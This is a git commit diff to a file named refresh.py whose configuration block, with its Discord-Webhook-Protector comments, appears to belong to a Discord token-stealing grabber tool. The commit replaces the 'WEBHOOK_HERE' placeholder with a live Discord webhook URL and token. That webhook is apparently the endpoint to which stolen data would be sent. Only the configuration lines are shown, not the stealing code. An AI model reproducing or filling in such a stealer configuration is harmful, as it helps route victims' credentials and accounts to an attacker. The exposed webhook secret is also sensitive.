aebfdc0510baa0c64c4d16dc419ebdfc1d76e1ff
toastedchild <83870894+toastedchild@users.noreply.github.com>
2025-03-12 20:11:53 +1100

    Update refresh.py

--- refresh.py
+++ refresh.py
@@ -33,7 +33,7 @@ from Crypto.Util.number import long_to_bytes
 config = {
     # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
     # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
-    'webhook': "WEBHOOK_HERE",
+    'webhook': "https://discord.com/api/webhooks/1349308565286031413/pH18WIi9TFIpC_6IzxUvIpNiDfKyG-ziwaJpwKJB2Bvux3nnTzASfjpPDs7jtpJXIf7t",
     # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
     'webhook_protector_key': "KEY_HERE",
     # keep it as it is unless you want to have a custom one
